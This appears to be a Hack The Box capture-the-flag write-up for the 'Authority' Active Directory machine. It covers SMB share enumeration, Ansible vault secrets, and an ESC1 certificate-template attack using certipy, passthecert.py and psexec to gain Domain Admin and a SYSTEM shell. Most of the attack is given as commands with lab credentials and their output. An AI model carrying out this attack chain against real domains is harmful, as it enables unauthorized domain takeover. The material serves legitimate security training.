An windows active directory Box
## Recon
```
└─# nmap -sV 10.10.11.222
Host is up (1.7s latency).
Not shown: 987 closed tcp ports (reset)
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
80/tcp   open  http              Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2023-11-29 13:02:36Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
8443/tcp open  ssl/https-alt
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF:rocess\x20the\x20request\x20due\x20to\x20something\x20that\x20is\x20per
SF:ceived\x20to\x20be\x20a\x20client\x20error\x20\(e\.g\.,\x20malformed\x2
SF:0request\x20syntax,\x20invalid\x20");
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows
```
The host name is AUTHORITY and the it's a Windows OS. also the domain `authority.htb`
Most notable open ports:
```
53 (DNS)
80 (HTTP)
88 (Kerberos)
445 (SMB)
389, 3268 (LDAP)
636, 3269 (LDAPS)
8443 (HTTPS)
```
```
└─# nmap -sC -p53,80,88,135,139,389,445,464,593,636,3268,3269,8443 10.10.11.222

PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2023-11-29T13:07:40+00:00; +4h00m00s from scanner time.
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2023-11-29T13:06:28+00:00; +4h00m00s from scanner time.
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2023-11-29T13:06:27+00:00; +3h59m59s from scanner time.
8443/tcp open  https-alt
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=172.16.2.118
| Not valid before: 2023-11-27T10:12:28
|_Not valid after:  2025-11-28T21:50:52
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).

Host script results:
|_clock-skew: mean: 3h59m59s, deviation: 0s, median: 3h59m59s
| smb2-time: 
|   date: 2023-11-29T13:06:29
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required


```
I visited the domain and i got an IIS server running.
I will try to enumerate subdomains. Nothing

So the port 445 is open i will enum SMB using crackmapexec.
https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/
```
└─# smbclient -L 10.10.11.222
Password for [WORKGROUP\bloman]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Department Shares Disk      
	Development     Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 

└─# smbclient \\\\10.10.11.222/Department\ Shares
Password for [WORKGROUP\bloman]:
Try "help" to get a list of possible commands.
smb: \> 

```
But nothing on this shares. so i will continue.
```
└─# smbclient --no-pass \\\\10.10.11.222/Development
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Mar 17 13:20:38 2023
  ..                                  D        0  Fri Mar 17 13:20:38 2023
  Automation                          D        0  Fri Mar 17 13:20:40 2023

		5888511 blocks of size 4096. 1521534 blocks available
smb: \> 
smb: \> cd Automation
smb: \Automation\> ls
  .                                   D        0  Fri Mar 17 13:20:40 2023
  ..                                  D        0  Fri Mar 17 13:20:40 2023
  Ansible                             D        0  Fri Mar 17 13:20:50 2023
cd 
		5888511 blocks of size 4096. 1521534 blocks available
smb: \Automation\> cd Ansible
smb: \Automation\Ansible\> ls
  .                                   D        0  Fri Mar 17 13:20:50 2023
  ..                                  D        0  Fri Mar 17 13:20:50 2023
  ADCS                                D        0  Fri Mar 17 13:20:48 2023
  LDAP                                D        0  Fri Mar 17 13:20:48 2023
  PWM                                 D        0  Fri Mar 17 13:20:48 2023
  SHARE                               D        0  Fri Mar 17 13:20:48 2023

		5888511 blocks of size 4096. 1521518 blocks available
smb: \Automation\Ansible\>
```
Now i will use `spider_plus` from `crackmapexec` listed all the files from the readable share:
```
└─# crackmapexec smb authority.htb -u 'a' -p '' -M spider_plus
:True) (SMBv1:False)
SMB         authority.htb   445    AUTHORITY        [+] authority.htb\a: 
SPIDER_P... authority.htb   445    AUTHORITY        [*] Started spidering plus with option:
SPIDER_P... authority.htb   445    AUTHORITY        [*]        DIR: ['print$']
SPIDER_P... authority.htb   445    AUTHORITY        [*]        EXT: ['ico', 'lnk']
SPIDER_P... authority.htb   445    AUTHORITY        [*]       SIZE: 51200
SPIDER_P... authority.htb   445    AUTHORITY        [*]     OUTPUT: /tmp/cme_spider_plus

```
I will download the Developpement share. Coz it contain files in our smbclient.
https://www.crackmapexec.wiki/smb-protocol/spidering-shares

```
└─# crackmapexec smb authority.htb -u 'a' -p '' -M spider_plus -o READ_ONLY=false EXCLUDE_DIR=IPC$
SMB         authority.htb   445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         authority.htb   445    AUTHORITY        [+] authority.htb\a: 
SPIDER_P... authority.htb   445    AUTHORITY        [*] Started spidering plus with option:
SPIDER_P... authority.htb   445    AUTHORITY        [*]        DIR: ['ipc$']
SPIDER_P... authority.htb   445    AUTHORITY        [*]        EXT: ['ico', 'lnk']
SPIDER_P... authority.htb   445    AUTHORITY        [*]       SIZE: 51200
SPIDER_P... authority.htb   445    AUTHORITY        [*]     OUTPUT: /tmp/cme_spider_plus


```
Using the option `-o READ_ONLY=false` all files will be copied on the host
```
└─# cat authority.htb.json 
{
    "Development": {
        "Automation/Ansible/ADCS/.ansible-lint": {
            "atime_epoch": "2023-03-17 13:20:48",
            "ctime_epoch": "2023-03-17 13:20:48",
            "mtime_epoch": "2023-03-17 13:37:52",
            "size": "259 Bytes"
        },
        "Automation/Ansible/ADCS/.yamllint": {
            "atime_epoch": "2023-03-17 13:20:48",
            "ctime_epoch": "2023-03-17 13:20:48",
            "mtime_epoch": "2023-03-17 13:37:52",
            "size": "205 Bytes"
        },
        "Automation/Ansible/ADCS/LICENSE": {
            "atime_epoch": "2023-03-17 13:20:48",
            "ctime_epoch": "2023-03-17 13:20:48",
            "mtime_epoch": "2023-03-17 13:37:52",
            "size": "11.1 KB"
        },
        "Automation/Ansible/ADCS/defaults/main.yml": {
            "atime_epoch": "2023-04-23 22:50:28",
            "ctime_epoch": "2023-03-17 13:20:48",
            "mtime_epoch": "2023-04-23 22:50:28",
            "size": "1.54 KB"
        },
        "Automation/Ansible/ADCS/meta/main.yml": {
            "atime_epoch": "2023-03-17 13:20:48",
            "ctime_epoch": "2023-03-17 13:20:48",
            "mtime_epoch": "2023-04-23 22:50:36",
            "size": "549 Bytes"
        },
        "Automation/Ansible/ADCS/meta/preferences.yml": {
            "atime_epoch": "2023-03-17 13:20:48",
            "ctime_epoch": "2023-03-17 13:20:48",
            "mtime_epoch": "2023-04-23 22:50:33",
            "size": "22 Bytes"
        }
    }
}   

```
```
└─# tree authority.htb 
authority.htb
└── Development
    └── Automation
        └── Ansible
            └── ADCS
                ├── defaults
                │└── main.yml
                ├── LICENSE
                └── meta
                    ├── main.yml
                    └── preferences.yml

6 directories, 4 files

```
```
└─# cat authority.htb/Development/Automation/Ansible/ADCS/defaults/main.yml 
# defaults file for ca

# set ca_init: 'yes' to create CA
ca_init: yes

# ca_own_root: 'yes' if you want to have yout own root CA.
# if no, set ca_certificate_path manually
ca_own_root: yes

# A passphrase for the CA key.
ca_passphrase: SuP3rS3creT

# The common name for the CA.
ca_common_name: authority.htb

# Other details for the CA.
ca_country_name: NL
ca_email_address: admin@authority.htb
ca_organization_name: htb
ca_organizational_unit_name: htb
ca_state_or_province_name: Utrecht
ca_locality_name: Utrecht

# There are two formats to request a key and certificate:
# 1. With details: (Includes `name:`)
# ca_requests:
#   - name: certificate1.example.com
#     passphrase: S3creT
#
# 2. Without details: (Does not include `name:`)
# ca_requests:
#   - "{{ ansible_fqdn }}"

# You can also mix these formats:
# ca_requests:
#   - name: certificate1.example.com
#     passphrase: S3creT
#   - "{{ ansible_fqdn }}"


```
I have some certificate here and passphrase.
Now i will dive on the developpement share to find some sensitive stuff
```
smb: \Automation\Ansible\> cd PWM
smb: \Automation\Ansible\PWM\> ls
  .                                   D        0  Fri Mar 17 13:20:48 2023
  ..                                  D        0  Fri Mar 17 13:20:48 2023
  ansible.cfg                         A      491  Thu Sep 22 05:36:58 2022
  ansible_inventory                   A      174  Wed Sep 21 22:19:32 2022
  defaults                            D        0  Fri Mar 17 13:20:48 2023
  handlers                            D        0  Fri Mar 17 13:20:48 2023
  meta                                D        0  Fri Mar 17 13:20:48 2023
  README.md                           A     1290  Thu Sep 22 05:35:58 2022
  tasks                               D        0  Fri Mar 17 13:20:48 2023
  templates                           D        0  Fri Mar 17 13:20:48 2023

```
In README file i got
```
Role Variables
--------------

- pwm_hostname: hostname that pwm will service, will be set to "pwm" by default
- pwm_port: hostname that pwm will service, will be set to 8888 by default.
- pwm_root_mysql_password: root mysql password, will be set to a random value by default.
- pwm_pwm_mysql_password: pwm mysql password, will be set to a random value by default.
* pwm_admin_login: pwm admin login name, 'root' by default.
- pwm_admin_password: pwm admin password, 'password' by default.

```
In the main.yml
```
└─# cat main.yml                                        
---
pwm_run_dir: "{{ lookup('env', 'PWD') }}"

pwm_hostname: authority.htb.corp
pwm_http_port: "{{ http_port }}"
pwm_https_port: "{{ https_port }}"
pwm_https_enable: true

pwm_require_ssl: false

pwm_admin_login: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          32666534386435366537653136663731633138616264323230383566333966346662313161326239
          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
          35653634376333666234613466396534343030656165396464323564373334616262613439343033
          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
          3438

pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
          38656432323830393339336231373637303535613636646561653637386634613862316638353530
          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          63303831303534303266356462373731393561313363313038376166336536666232626461653630
          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
          34646237336164356438383034623462323531316333623135383134656263663266653938333334
          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
          3764  

```
I will crack the ldap_admin_password 

```
evil-winrm  --ip 10.10.11.222 --user svc_ldap --password lDaP_1n_th3_cle4r!
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> whoami
htb\svc_ldap
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> 
type *Evil-WinRM* PS C:\Users\svc_ldap\Desktop> type user.txt
460337f6162c966042bd6350e30ad445
```
## Privilege Escalation
i will try certipy
```
└─# certipy find -u svc_ldap@authority.htb -p lDaP_1n_th3_cle4r! -dc-ip 10.10.11.222
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Trying to get CA configuration for 'AUTHORITY-CA' via CSRA
[!] Got error while trying to get CA configuration for 'AUTHORITY-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'AUTHORITY-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'AUTHORITY-CA'
[*] Saved BloodHound data to '20231129134919_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20231129134919_Certipy.txt'
[*] Saved JSON output to '20231129134919_Certipy.json'
```
I found
```
      },
      "[!] Vulnerabilities": {
        "ESC1": "'AUTHORITY.HTB\\\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication"
      }
    },
```
add a new computer 
```
└─# addcomputer.py 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!' -method LDAPS -computer-name 'NEWPC' -computer-pass 'Password123' 
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Successfully added machine account NEWPC$ with password Password123.

```
Then, I requested a certificate with certipy as the newly created machine account. I specified the certificate authority, dns name, CorpVPN template, and supplied the User Principal Name of administrator@authority.htb:
```
└─# certipy req -username NEWPC$ -password Password123 -ca AUTHORITY-CA -target authority.htb -template CorpVPN -upn administrator@authority.htb -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Trying to resolve 'authority.htb' at '192.168.54.77'
[+] Trying to resolve '' at '192.168.54.77'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.10.11.222[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.10.11.222[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 18
[*] Got certificate with UPN 'administrator@authority.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'



```
When I tried to authenticate with the certificate I received a Kerberos session error. This was most likely occurring due to the certificate template not having Smart Card Logon EKU:
There's a useful tool that accounts for a situation like this by providing a way to authenticate against an LDAPS server using Schannel and then perform attack actions: PassTheCert

To use passthecert.py, I extracted the cert and key from the pfx with certipy:
```
└─# certipy cert -pfx administrator.pfx -nokey -out administrator.crt 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Writing certificate and  to 'administrator.crt'

└─# certipy cert -pfx administrator.pfx -nocert -out administrator.key
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Writing private key to 'administrator.key'

```

I will use PasstheCert
```
└─# python3 /home/bloman/tools/Windows/PassTheCert/Python/passthecert.py -action whoami -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.10.11.222
Impacket v0.11.0 - Copyright 2023 Fortra

[*] You are logged in as: HTB\Administrator
                                              
└─# python3 /home/bloman/tools/Windows/PassTheCert/Python/passthecert.py -action ldap-shell -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.10.11.222

# add_user_to_group svc_ldap "Domain Admins"
Adding user: svc_ldap to group Domain Admins result: OK

# get_user_groups svc_ldap
CN=Domain Admins,CN=Users,DC=authority,DC=htb
CN=Denied RODC Password Replication Group,CN=Users,DC=authority,DC=htb
CN=Administrators,CN=Builtin,DC=authority,DC=htb
CN=Remote Management Users,CN=Builtin,DC=authority,DC=htb

```
I added my user into the domain admin. now i will connect using psexec
```
┌──(root㉿1337)-[/home/…/CTFs/Boot2root/HacktheBox/Machines]
└─# psexec.py authority.htb/svc_ldap@authority.htb
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[*] Requesting shares on authority.htb.....
[*] Found writable share ADMIN$
[*] Uploading file xxgaTKjU.exe
[*] Opening SVCManager on authority.htb.....
[*] Creating service Iwyd on authority.htb.....
[*] Starting service Iwyd.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.4644]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> 


 Directory of C:\Users\Administrator\Desktop

07/12/2023  12:21 PM    <DIR>          .
07/12/2023  12:21 PM    <DIR>          ..
11/29/2023  08:47 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   6,232,190,976 bytes free

C:\Users\Administrator\Desktop> type root.txt
5d60355628d2db5437b39ccbb8e5d3e7

C:\Users\Administrator\Desktop> 


```